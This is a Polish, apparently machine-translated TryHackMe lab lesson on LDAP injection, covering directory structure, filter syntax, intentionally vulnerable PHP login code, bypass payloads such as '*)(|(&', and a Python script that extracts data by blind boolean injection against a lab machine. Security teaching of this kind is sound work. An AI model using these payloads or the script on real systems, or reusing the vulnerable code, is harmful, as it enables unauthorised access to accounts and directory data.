

### Wstęp

LDAP, czyli Lightweight Directory Access Protocol, to powszechnie używany protokół dostępu do rozproszonych usług katalogowych i ich obsługi w sieciach opartych na protokole internetowym (IP). LDAP umożliwia organizacjom centralne zarządzanie użytkownikami, grupami i innymi informacjami katalogowymi, często wykorzystywanymi do uwierzytelniania i autoryzacji w aplikacjach internetowych i wewnętrznych.

### Cele

1. Zapewnij gruntowną wiedzę na temat protokołu LDAP i jego roli w usługach katalogowych.
2. Poznaj strukturę drzewa LDAP i jego główne komponenty.
3. Przedstawimy atak LDAP Injection, jego skutki i sposoby wykorzystania.
4. Wyposażenie uczestników w wiedzę i umiejętności pozwalające identyfikować i ograniczać podatności na ataki typu LDAP Injection.

### Wymagania wstępne

1. Podstawowa wiedza na temat działania usług katalogowych, w szczególności LDAP.
2. Podstawowa wiedza na temat zasad bezpieczeństwa aplikacji internetowych i typowych luk w zabezpieczeniach.
3. Znajomość struktury i komponentów protokołu LDAP, takich jak nazwy wyróżniające (DNs) i atrybuty.
4. Doświadczenie w korzystaniu z narzędzi i technik testowania bezpieczeństwa aplikacji internetowych, takich jak:[OWASP ZASTRZELIĆ](https://tryhackme.com/room/learnowaspzap)Lub[Burp Suite](https://tryhackme.com/module/learn-burp-suite).


W LDAP wpisy w katalogu są ustrukturyzowane jako obiekty, z których każdy podlega określonemu schematowi definiującemu reguły i atrybuty mające zastosowanie do obiektu. To podejście obiektowe zapewnia spójność i reguluje sposób, w jaki obiekty takie jak użytkownicy czy grupy mogą być reprezentowane i manipulowane w katalogu.

**Usługi korzystające z protokołu LDAP** :

- **Microsoft Active Directory:** Usługa dla sieci domenowych Windows wykorzystująca protokół LDAP jako część swojego podstawowego zestawu protokołów do zarządzania zasobami domeny.
- **OpenLDAP:** Otwarta implementacja protokołu LDAP, powszechnie stosowana do zarządzania informacjami o użytkownikach i obsługi mechanizmów uwierzytelniania na różnych platformach.

### Format LDIF

Wpisy LDAP można reprezentować za pomocą formatu LDAP Data Interchange Format (LDIF), standardowego formatu danych w postaci zwykłego tekstu, służącego do reprezentacji wpisów katalogowych LDAP i operacji aktualizacji. LDIF importuje i eksportuje zawartość katalogów oraz opisuje modyfikacje katalogów, takie jak dodawanie, modyfikowanie lub usuwanie wpisów.

### Struktura

Katalog LDAP ma strukturę hierarchiczną, taką jaksystem plikówDrzewo 's. Ta struktura składa się z różnych wpisów reprezentujących unikalny element, taki jak użytkownik, grupa lub zasób.

![Struktura LDAP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f6e0e81b34c5e02559b27b192aba794a.png)

Na szczycie drzewa LDAP znajduje się **domena najwyższego poziomu (TLD)** , taka jak `dc=ldap,dc=thm`. Pod domeną TLD mogą znajdować się **subdomeny** lub **jednostki organizacyjne (OU)** , takie jak `ou=people`lub `ou=groups`, które dodatkowo kategoryzują wpisy w katalogu.

- **Nazwy wyróżniające (DN):** służą jako unikatowe identyfikatory każdego wpisu w katalogu, określając ścieżkę od szczytu drzewa LDAP do wpisu, na przykład: `cn=John Doe,ou=people,dc=example,dc=com`.
- **Nazwy względne wyróżniające (RDN):** reprezentują poszczególne poziomy w hierarchii katalogowej, na przykład `cn=John Doe`, gdzie `cn`oznacza nazwę wspólną.
- **Atrybuty:** Definiuj właściwości wpisów w katalogu, np `mail=john@example.com`. adresu e-mail.


### Zapytania wyszukiwania

LDAPZapytania wyszukiwania są podstawą interakcji z katalogami LDAP, umożliwiając lokalizowanie i pobieranie informacji przechowywanych w katalogu. Zrozumienie sposobu konstruowania tych zapytań jest kluczowe dla efektywnego korzystania z usług LDAP.

Zapytanie wyszukiwania LDAP składa się z kilku komponentów, z których każdy pełni określoną funkcję w operacji wyszukiwania:

1. **DN bazowy (nazwa wyróżniająca):** Jest to punkt początkowy wyszukiwania w drzewie katalogowym.
2. **Zakres:** Określa, jak głęboko ma sięgać wyszukiwanie od nazwy podstawowej. Może to być jedna z następujących wartości:
    - `base`(przeszukaj tylko bazę DN),
    - `one`(przeszukaj bezpośrednie dzieci bazy DN),
    - `sub`(przeszukaj bazę DN i wszystkich jej potomków).
3. **Filtr:** Aby kryteria zostały zwrócone w wynikach wyszukiwania, muszą być zgodne. Do zdefiniowania tych kryteriów używana jest określona składnia.
4. **Atrybuty:** Określa, które cechy pasujących wpisów powinny zostać zwrócone w wynikach wyszukiwania.

Podstawowa składnia zapytania wyszukiwania LDAP wygląda następująco:

```default
(base DN) (scope) (filter) (attributes)
```

### Filtry i składnia

Filtry stanowią rdzeń zapytań wyszukiwania LDAP, definiując warunki, jakie muszą spełniać wpisy w katalogu, aby znalazły się w wynikach wyszukiwania. Składnia filtrów LDAP jest zdefiniowana w [dokumencie RFC 4515.(otwiera się w nowej karcie)](https://www.openldap.org/lists/ietf-ldapbis/200606/msg00010.html)gdzie filtry są reprezentowane jako ciągi znaków o określonym formacie, takim jak `(canonicalName=value)`. Filtry LDAP mogą używać różnych operatorów do doprecyzowania kryteriów wyszukiwania, w tym równości ( `=`), obecności ( `=*`), większego niż ( `>=`) i mniejszego niż ( `<=`).

Jednym z najważniejszych operatorów w filtrach LDAP jest symbol wieloznaczny `*`, który oznacza dopasowanie do dowolnej liczby znaków. Operator ten jest kluczowy przy formułowaniu warunków wyszukiwania z dopasowaniem szerokim lub częściowym.

### Przykłady filtrów

**Prosty filtr:**

```default
(cn=John Doe)
```

Ten filtr wykrywa wpisy z nazwą kanoniczną ( `cn`) dokładnie odpowiadającą nazwie „John Doe”.

**Symbole wieloznaczne:**

```php
(cn=J*)
```

Ten filtr stosuje operator symbolu wieloznacznego w celu dopasowania dowolnego wpisu, którego nazwa `cn`zaczyna się od „J”, niezależnie od tego, co następuje po nim.

**Złożone filtry z operatorami logicznymi:**

W przypadku bardziej złożonego zapytania wyszukiwania filtry można stosować razem, używając operatorów logicznych, takich jak AND ( `&`), OR ( `|`) i NOT ( `!`).

```default
(&(objectClass=user)(|(cn=John*)(cn=Jane*)))
```

Ten filtr wyszukuje wpisy sklasyfikowane jako „użytkownik” w ich klasie obiektów, których nazwa kanoniczna zaczyna się od „John” lub „Jane”.

Choć usługi LDAP nie są zazwyczaj bezpośrednio dostępne, można z nich korzystać przez sieć za pośrednictwem portów 389 (dla połączeń nieszyfrowanych lub StartTLS) i 636 (dla połączeń SSL/TLS). Gdy usługi LDAP są publicznie dostępne, `ldapsearch`do interakcji z serwerem LDAP można użyć narzędzi takich jak , wchodzących w skład pakietu OpenLDAP. Narzędzie to umożliwia użytkownikowi wyszukiwanie i modyfikowanie katalogu LDAP z poziomu wiersza poleceń, co czyni je cennym zasobem zarówno dla legalnych zadań administracyjnych, jak i potencjalnie dla atakujących wykorzystujących luki w zabezpieczeniach LDAP Injection. Na przykład:

Przykładowe zapytanie wyszukiwania przy użyciu ldapsearch

```shell-session
user@tryhackme$ ldapsearch -x -H ldap://MACHINE_IP:389 -b "dc=ldap,dc=thm" "(ou=People)"
# extended LDIF
#
# LDAPv3
# base <dc=ldap,dc=thm> with scope subtree
# filter: (ou=People)
# requesting: ALL
#

# People, ldap.thm
dn: ou=People,dc=ldap,dc=thm
objectClass: organizationalUnit
objectClass: top
ou: People

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

To polecenie służy `ldapsearch`do przeprowadzania wyszukiwania na serwerze LDAP znajdującym się na podatnym komputerze na porcie 389, zaczynając od nazwy bazowej `dc=ldap,dc=thm`i używając filtru, który będzie wyszukiwał wpisy w jednostce organizacyjnej Ludzie.


### Podstawy wtrysku

LDAPWstrzyknięcie to krytyczna luka w zabezpieczeniach, która występuje, gdy dane wprowadzane przez użytkownika nie są odpowiednio oczyszczane przed włączeniem do zapytań LDAP. To niedopatrzenie umożliwia atakującym manipulowanie tymi zapytaniami, co prowadzi do nieautoryzowanego dostępu lub manipulacji danymi katalogowymi LDAP.

Atak LDAP Injection wykorzystuje sposób, w jaki aplikacje internetowe konstruują zapytania LDAP. Gdy dane wprowadzane przez użytkownika są bezpośrednio uwzględniane w tych zapytaniach bez odpowiedniej walidacji lub kodowania, atakujący mogą wstrzyknąć złośliwe instrukcje LDAP. Może to skutkować nieautoryzowanym dostępem do poufnych informacji, modyfikacją danych katalogowych lub ominięciem mechanizmów uwierzytelniania.

Proces jest analogiczny doSQLWstrzyknięcie, gdzie złośliwe instrukcje SQL są wstrzykiwane do zapytań w celu manipulowania operacjami bazy danych. W przypadku wstrzykiwania LDAP, złośliwy kod atakuje zapytania LDAP.

### Typowe wektory ataków

1. **Ominięcie uwierzytelniania:** Modyfikacja zapytań uwierzytelniania LDAP w celu zalogowania się jako inny użytkownik bez znajomości jego hasła.
2. **Nieautoryzowany dostęp do danych:** zmiana zapytań wyszukiwania LDAP w celu pobrania poufnych informacji, do których atakujący nie powinien mieć dostępu.
3. **Manipulacja danymi:** Wstrzykiwanie zapytań modyfikujących katalog LDAP, takich jak dodawanie lub modyfikowanie atrybutów użytkownika.

### Proces wtrysku

Przeprowadzenie ataku typu LDAP Injection wymaga wykonania kilku kluczowych kroków — od zidentyfikowania punktu wstrzyknięcia po skuteczne wykorzystanie luki w zabezpieczeniach.

![Proces wstrzykiwania LDAP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5813e9f3ac2fdcc629ec1b047a75cee1.png)  

Ten diagram ilustruje interakcję między atakującym, aplikacją internetową i serwerem LDAP podczas ataku typu LDAP Injection. Atakujący wprowadza złośliwe dane do formularza logowania aplikacji internetowej, który konstruuje zapytanie LDAP uwzględniające te dane. Serwer LDAP następnie wykonuje zmodyfikowane zapytanie, co może prowadzić do potencjalnego nieautoryzowanego dostępu lub ujawnienia informacji, w zależności od charakteru wstrzykniętego ładunku.


### LDAP

Ataki typu LDAP Injection mogą być szczególnie niebezpieczne, gdy są wykorzystywane w mechanizmach uwierzytelniania. Atakujący mogą manipulować zapytaniami LDAP dotyczącymi uwierzytelniania użytkowników, aby ominąć zabezpieczenia i uzyskać nieautoryzowany dostęp do aplikacji.

Na przykład poniżej przedstawiono uproszczonyPHPfragment kodu użyty w aplikacji internetowej do uwierzytelniania użytkownika na serwerze LDAP:

```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost";
$ldap_dn = "ou=People,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm";
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

// LDAP search filter
$filter = "(&(uid=$username)(userPassword=$password))";

// Perform the LDAP search
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

// Check if the search was successful
if ($search_result) {
    // Retrieve the entries from the search result
    $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    $message = "Welcome, " . $entry['cn'][0] . "!\n";
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    $error = "LDAP search failed\n";
}
?>
```

Ten kod jest podatny na ataki, ponieważ bezpośrednio wstawia dane wejściowe użytkownika ( `$username`i `$password`) do zapytania LDAP bez odpowiedniej sanityzacji lub ucieczki. Atakujący może to wykorzystać do wstrzyknięcia złośliwych filtrów LDAP.

Aby wykorzystać tę lukę, atakujący może przesłać nazwę użytkownika za pomocą złośliwego filtra LDAP. Na przykład, atakujący może użyć nazwy użytkownika takiej jak `*`, która po wstawieniu do zapytania LDAP, w efekcie zamienia zapytanie w warunek, który zawsze zwraca wartość true, omijając uwierzytelnianie.

To zapytanie zostanie pomyślnie uwierzytelnione, jeśli w katalogu LDAP znajduje się jakikolwiek użytkownik, ponieważ wstrzykiwany warunek `uid=*`zawsze będzie oceniany jako prawdziwy.

### Techniki omijania uwierzytelniania

**Wtrysk oparty na tautologii**

Wstrzykiwanie oparte na tautologii polega na wstawianiu do zapytania LDAP warunków, które są z natury prawdziwe, zapewniając w ten sposób, że zapytanie zawsze zwróci wynik pozytywny, niezależnie od zamierzonej logiki. Ta metoda jest szczególnie skuteczna w przypadku zapytań LDAP tworzonych na podstawie danych wprowadzonych przez użytkownika, które nie zostały odpowiednio oczyszczone. Rozważmy na przykład zapytanie uwierzytelniające LDAP, w którym nazwa użytkownika i hasło są wstawiane bezpośrednio z danych wprowadzonych przez użytkownika:

```php
(&(uid={userInput})(userPassword={passwordInput}))
```

Atakujący może podać dane wejściowe oparte na tautologii, takie jak `*)(|(&` for `{userInput}` i `pwd)`for `{passwordInput}`which, które przekształcają zapytanie w:

```php
(&(uid=*)(|(&)(userPassword=pwd)))
```

To zapytanie skutecznie omija sprawdzanie hasła dzięki sposobowi użycia operatorów logicznych w filtrze. Zapytanie składa się z dwóch części, połączonych operatorem AND ( `&`).

1. `(uid=*)`:Ta część filtru dopasowuje dowolny wpis zawierający `uid`atrybut, zasadniczo wszystkich użytkowników, ponieważ symbol wieloznaczny `*`dopasowuje dowolną wartość.
    
2. `(|(&)(userPassword=pwd))`: Operator OR ( `|`), co oznacza, że ​​dowolny z dwóch zawartych warunków musi być spełniony, aby filtr przeszedł. W protokole LDAP pusty `(&)`warunek AND ( ) jest zawsze uznawany za prawdziwy. Drugi warunek sprawdza, czy atrybut `userPassword`pasuje do wartości `pwd`, co może się nie powieść, jeśli użytkownik nie używa `pwd`hasła.
    

Łącząc to wszystko, druga część filtra `(|(&)(userPassword=pwd))`zawsze zostanie uznana za prawdziwą ze względu na `(&)`warunek. Operator OR wymaga, aby tylko jeden z zawartych w nim warunków był prawdziwy, a ponieważ `(&)`jest zawsze prawdziwy, cały warunek OR jest prawdziwy, niezależnie od tego, czy `(userPassword=pwd)`jest prawdziwy, czy fałszywy.

W rezultacie zapytanie zwracane jest poprawnie dowolnemu użytkownikowi bez konieczności weryfikacji jego hasła, co powoduje pominięcie mechanizmu sprawdzania hasła.

**Wstrzyknięcie symbolu wieloznacznego**

Symbole wieloznaczne ( `*`) są używane w zapytaniach LDAP do dopasowania dowolnej sekwencji znaków, co czyni je potężnymi narzędziami do wyszukiwania szerokiego. Jednak gdy dane wprowadzane przez użytkownika zawierające symbole wieloznaczne nie są poprawnie oczyszczane, może to prowadzić do niezamierzonych wyników zapytania, takich jak ominięcie uwierzytelniania poprzez dopasowanie wielu lub wszystkich wpisów. Na przykład, jeśli zapytanie wyszukiwania wygląda następująco:

```php
(&(uid={userInput})(userPassword={passwordInput}))
```

Atakujący może użyć symbolu wieloznacznego jako danych wejściowych w obupłyni userPassword. Użycie argumentu `*`„for” `{userInput}`mogłoby zmusić zapytanie do zignorowania konkretnych nazw użytkowników i skupienia się na haśle. Jednak ponieważ w argumencie występuje również symbol wieloznaczny `{passwordInput}`, nie weryfikuje ono zawartości pola hasła pod kątem określonej wartości oczekiwanej. Zamiast tego sprawdza jedynie obecność atrybutu `userPassword`, niezależnie od jego zawartości.

Oznacza to, że zapytanie zwróci wynik pozytywny dla dowolnego użytkownika bez weryfikacji, czy hasło podane podczas uwierzytelniania jest zgodne z hasłem zapisanym. W rezultacie skutecznie omija to mechanizm sprawdzania hasła.

### Przykład pominięcia uwierzytelniania

Aby zademonstrować prosty atak typu LDAP Injection, przejdź do [http://MACHINE_IP/normal.php(otwiera się w nowej karcie)](http://machine_ip/normal.php)Na podstawie powyższego kodu aplikacja konstruuje zapytanie LDAP w celu uwierzytelnienia na podstawie danych wprowadzonych przez użytkownika, bez odpowiedniej dezynfekcji.

Atakujący może to wykorzystać, podając nazwę użytkownika i hasło ze znakiem, którego aplikacja nie przewiduje, na przykład gwiazdką (*) dla wartości atrybutów uid i userPassword. Dzięki temu warunek zawsze będzie miał wartość true, skutecznie omijając weryfikację hasła:

**Wstrzyknięta nazwa użytkownika i hasło:**

```php
username=*&password=*
```

![Wstrzyknięta nazwa użytkownika i hasło](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8fc230d9a07a8adaa3fda06498fdf9dd.png)

**Wynikowy komponent zapytania LDAP:**

```php
(&(uid=*)(userPassword=*))
```

![Wynikowy komponent zapytania LDAP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/20b2a4f30e7b3880a934196393926ed3.png)  

To wstrzyknięcie zawsze powoduje, że warunek zapytania LDAP jest prawdziwy. Jednak użycie samego , `*`zawsze spowoduje pobranie pierwszego wyniku zapytania. Aby zaatakować dane zaczynające się od określonego znaku, atakujący może użyć ładunku, takiego jak `f*`, który wyszukuje identyfikator użytkownika rozpoczynający się na literę f.

![Wynik pokazujący flagę](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3c98354e63406ae68366efa5d1dcf291.png)


### BLIND LDAP Zastrzyk

Ślepe wstrzyknięcie LDAP to subtelniejsza odmiana wstrzyknięcia LDAP, w której atakujący nie otrzymuje bezpośrednio danych wyjściowych z wstrzykniętego ładunku. Zamiast tego musi wywnioskować informacje na podstawie zachowania aplikacji. Ten typ ataku jest trudniejszy, ale nadal może być wykorzystany do wydobycia poufnych informacji z katalogu LDAP.

Ślepe wstrzyknięcie LDAP wymaga innego podejścia ze względu na brak jawnych wyników zapytania. Atakujący muszą polegać na pośrednich sygnałach, takich jak zmiany w zachowaniu aplikacji, komunikaty o błędach lub czasy odpowiedzi, aby wywnioskować strukturę zapytania LDAP i istnienie luk w zabezpieczeniach.

Na przykład poniżej znajduje się fragment kodu[http://IP_MASZYNY/blind.php(otwiera się w nowej karcie)](http://machine_ip/blind.php) która używa zapytania LDAP do sprawdzenia istnienia użytkownika, ale w przypadku niepowodzenia zwraca jedynie ogólny komunikat o błędzie. Aplikacja sprawdza również, czy przesłany adres e-mail jest taki sam, jak adres e-mail w bazie danych:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$ldap_server = "ldap://localhost"; 
$ldap_dn = "ou=users,dc=ldap,dc=thm";
$admin_dn = "cn=tester,dc=ldap,dc=thm"; 
$admin_password = "tester"; 

$ldap_conn = ldap_connect($ldap_server);
if (!$ldap_conn) {
    die("Could not connect to LDAP server");
}

ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);

if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
    die("Could not bind to LDAP server with admin credentials");
}

$filter = "(&(uid=$username)(userPassword=$password))";
$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);

if ($search_result) {
   $entries = ldap_get_entries($ldap_conn, $search_result);
    if ($entries['count'] > 0) {
        foreach ($entries as $entry) {
            if (is_array($entry)) {
                if (isset($entry['cn'][0])) {
                    if($entry['uid'][0] === $_POST['username']){
                        $message = "Welcome, " . $entry['cn'][0] . "!\n";
                    }else{
                        $message = "Something is wrong in your password.\n";
                    }
                }
            }
        }
    } else {
        $error = true;
    }
} else {
    echo "LDAP search failed\n";
}

ldap_close($ldap_conn);
```

Ten kod jest podatny na ślepe wstrzyknięcie LDAP, ponieważ konstruuje filtr LDAP na podstawie niesprawdzonych danych wejściowych użytkownika. Dostarcza on jednak jedynie niejasnych informacji zwrotnych, co utrudnia jego bezpośrednią eksploatację.

Aby wykorzystać tę lukę, atakujący może użyć techniki znanej jako „ślepe wstrzykiwanie LDAP oparte na wartościach boolowskich”. Atakujący wstrzykuje warunki do pola nazwy użytkownika, aby zapytanie LDAP było prawdziwe lub fałszywe, obserwując zachowanie aplikacji i wnioskowanie informacji.

Na przykład atakujący może spróbować wstrzyknąć nazwę użytkownika taką jak `a*)(|(&`, która po uwzględnieniu w zapytaniu LDAP będzie sprawdzała, czy istnieje użytkownik z „a” w swoim identyfikatorze użytkownika:

**Wstrzyknięta nazwa użytkownika i hasło:**

```bash
username=a*%29%28%7C%28%26&password=pwd%29
```

**Uwaga:** Powyższy ładunek to zakodowana w adresie URL wersja ładunku `a*)(|(&`dla nazwy użytkownika i `pwd)`hasła. Przed użyciem należy ją najpierw zdekodować w adresie URL.

![Wstrzyknięta nazwa użytkownika i hasło](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/053b772823397558933f0b87b9d182ed.png)

**Wynik zapytania LDAP:**

```bash
(&(uid=a*)(|(&)(userPassword=pwd))) 
```

![wynikowe zapytanie LDAP](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/75795810cd9b19f32d96ff8d445f030b.png)  

Jeżeli aplikacja zwróci komunikat „W Twoim haśle jest coś nie tak”, atakujący może wywnioskować, że użytkownik, którego konto zaczyna się na literę „a”,płynistnieje w katalogu LDAP. Aby sprawdzić obecność kolejnego znaku, atakujący może powtórzyć ładunek, podając kolejny znak, na przykład:

**Wstrzyknięta nazwa użytkownika i hasło:**

```php
username=ab*%29%28%7C%28%26&password=pwd%29
```

![Druga postać wstrzyknięta do ładunku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/33cde2b19ebe09a39013ef40d8bf3f85.png)

**Wynik zapytania LDAP:**

```php
(&(uid=ab*)(|(&)(userPassword=pwd))) 
```

![Wynik zapytania LDAP drugiego znaku](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/32e2c63e294e84663ee560f7cb6e14d5.png)

Oznacza to, że następny znak nie jest „b”. Atakujący może zautomatyzować tego rodzaju sprawdzanie, iteracyjnie odgadując znaki wiadomości e-mail, obserwując zachowanie aplikacji internetowej w odpowiedzi na zmodyfikowane dane wejściowe, podobnie jak w przypadku algorytmu opartego na wartościach boolowskich.SQLAtak wstrzyknięciem.

### Techniki ekstrakcji informacji

1. **Eksploatacja boolowska:** Polega na wstrzykiwaniu warunków, które są oceniane jako prawda lub fałsz, i obserwowaniu reakcji aplikacji w celu wywnioskowania danych. Na przykład, jeśli aplikacja zachowuje się inaczej, gdy warunek jest prawdziwy, atakujący może wywnioskować, że wstrzykiwany warunek pasuje do istniejącego wpisu w katalogu LDAP.
2. **Wnioskowanie oparte na błędach:** W niektórych przypadkach określone wstrzyknięcia mogą powodować komunikaty o błędach lub nietypowe zachowanie aplikacji, dostarczając wskazówek na temat struktury LDAP lub potwierdzając powodzenie określonych ładunków.



### Kod exploita

Aby zautomatyzować eksfiltrację danych z poprzedniego zadania, możesz skorzystać z poniższego skryptu Pythona:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://MACHINE_IP/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

**Kliknij tutaj, aby zapoznać się ze szczegółowym opisem skryptu.**

1. **Importy** :
    - `requests`:Biblioteka języka Python do tworzenia żądań HTTP.
    - `BeautifulSoup`z `bs4`: Biblioteka do parsowania dokumentów HTML, ułatwiająca nawigację i przeszukiwanie drzewa parsowania.
    - `string`:Moduł zawierający typowe operacje na ciągach znaków, w tym zbiór stałych ciągów znaków.
    - `time`:Moduł udostępniający różne funkcje związane z czasem.
2. **Organizować coś** :
    - Zmienna `url`jest ustawiona na `'http://MACHINE_IP/blind.php'`, co oznacza adres URL docelowy, pod którymHTTPZostaną wysłane żądania POST.
    - `char_set`Zawiera małe i wielkie litery, cyfry oraz zestaw znaków specjalnych. Ten zestaw reprezentuje wszystkie znaki, które skrypt będzie iterował, aby odgadnąć hasło.
3. **Inicjalizacja zmiennych** :
    - `successful_response_found`to flaga służąca do sterowania pętlą while. Zaczyna się od `True`wejścia do pętli i jest ustawiana na , `False`gdy nie zostanie znaleziony żaden znak.
    - `successful_chars`przechowuje sekwencję pomyślnie odgadniętych znaków.
4. **Nagłówki HTTP** :
    - Słownik `headers`jest definiowany z typem zawartości ustawionym na `'application/x-www-form-urlencoded'`, wskazującym format treści żądania HTTP POST.
5. **Pętla główna** :
    - Skrypt wchodzi w `while`pętlę, która trwa tak długo, jak `successful_response_found`jest `True`.
    - Wewnątrz tej pętli następuje iteracja po każdym znaku w `char_set`.
6. **Tworzenie i wysyłanie żądań HTTP** :
    - Dla każdego znaku skrypt tworzy słownik `data`z parą klucz-wartość przeznaczoną dla żądania HTTP POST. `username`Do pola wstrzykiwany jest ładunek łączący poprawnie znalezione znaki i aktualnie testowany znak, a następnie `*)(|(&`, który jest częścią składni wstrzykiwania. `password`Pole jest dowolnie ustawiane na `'pwd)'`.
    - Żądanie HTTP POST jest wysyłane do celu `url`ze spreparowanymi `data`i `headers`.
7. **Obsługa odpowiedzi** :
    - Treść odpowiedzi jest analizowana przy użyciu narzędzia BeautifulSoup w celu analizy struktury HTML.
    - Skrypt wyszukuje `<p>`tagi z `style`atrybutem `'color: green;'`, który ma oznaczać pomyślne odgadnięcie.
8. **Weryfikacja postaci** :
    - Jeśli takie akapity zostaną znalezione, oznacza to, że bieżący znak jest częścią hasła. Znak ten jest następnie dodawany do `successful_chars`, a skrypt wychodzi z pętli wewnętrznej, aby sprawdzić kolejny znak.
    - Jeżeli żaden akapit nie spełnia kryteriów, skrypt uznaje, że w bieżącej iteracji nie znaleziono żadnych pomyślnych znaków, wyświetla komunikat i wychodzi z pętli.
9. **Wyjście** :
    - Gdy wszystkie znaki zostaną sprawdzone lub zostanie znaleziona prawidłowa sekwencja, skrypt drukuje ostateczną sekwencję prawidłowo znalezionych znaków.

Powyższy skrypt iteracyjnie odgaduje znaki wiadomości e-mail, obserwując zachowanie aplikacji internetowej w odpowiedzi na spreparowane dane wejściowe.

### Automatyzacja

Zapisz powyższy kod Pythona. Jeśli używasz AttackBoxa, wymagane moduły Pythona zostały już zainstalowane. Pamiętaj, aby użyć tego polecenia, `python3.9`jeśli używasz AttackBoxa, ponieważ jest na nim zainstalowanych wiele modułów Pythona.

Poniżej znajduje się przykład polecenia pokazującego jak uruchomić skrypt automatyzacji:

~/Pobieranie

```shell-session
user@tryhackme$ ls
script.py
user@tryhackme$ python3.9 script.py
```

Spowoduje to natychmiastowe wyświetlenie wyników próby siłowej, jak pokazano poniżej:

![wynik ataku siłowego](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f928c8f0afa797fe8627a17fa1f81352.png)

Użyj ostatniego ładunku, aby zalogować się do  [http://MACHINE_IP/login.php(otwiera się w nowej karcie)](http://machine_ip/login.php). Upewnij się, że używasz `*`tego hasła; spowoduje to automatyczną ocenę zapytania wyszukiwania jako prawdziwego.

![Ostateczny ładunek w zapytaniu wyszukiwania](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/170c510494342b0e07b09f9225ea33f0.png)

![Panel zawierający flagę](https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/13f3c3703d5bc9d94a7c60d0c657c598.png)


### Wniosek

Gratulacje z okazji ukończeniaLDAPWstrzyknięcie! Oto podsumowanie kluczowych pojęć, które omówiliśmy:

1. **Podstawy LDAP:** Zaczęliśmy od zrozumienia roli LDAP w usługach katalogowych i poznania struktury drzewa LDAP, w tymDNs, RDN i atrybuty.
2. **Zapytania wyszukiwania LDAP:** Nauczyłeś się, jak tworzyć podstawowe zapytania wyszukiwania LDAP, rozumiesz znaczenie filtrów i ich składnię.
3. **Podstawy ataków typu LDAP Injection:** Dowiedziałeś się, czym jest atak typu LDAP Injection, jak działa i jakie są typowe wektory ataku. Zwróciłeś uwagę na ryzyko związane z nieprawidłowo oczyszczonymi danymi wejściowymi w zapytaniach LDAP.
4. **Wykorzystanie ataków LDAP Injection w mechanizmach logowania:** Omówiono techniki omijania uwierzytelniania za pomocą ataków LDAP Injection oraz ćwiczenia praktyczne symulujące podatne na ataki systemy logowania.
5. **Techniki ślepego wstrzykiwania LDAP:** Omówiono wyzwania i metodologie ekstrakcji informacji poprzez ślepe wstrzykiwanie LDAP, będące subtelniejszą formą wstrzykiwania LDAP.

### Dodatkowe zasoby

Aby kontynuować swoją przygodę ze zdobywaniem wiedzy na temat protokołu LDAP i powiązanych z nim koncepcji bezpieczeństwa, rozważ zapoznanie się z następującymi materiałami:

- **[TryHackMe: naruszenieOGŁOSZENIE](https://tryhackme.com/room/breachingad):** W tej sali można dogłębnie przyjrzeć się środowiskom Active Directory, zdobyć praktyczne doświadczenie w wykorzystywaniu typowych luk w zabezpieczeniach usługi AD i zrozumieć mechanizmy bezpieczeństwa w ramach usługi AD.
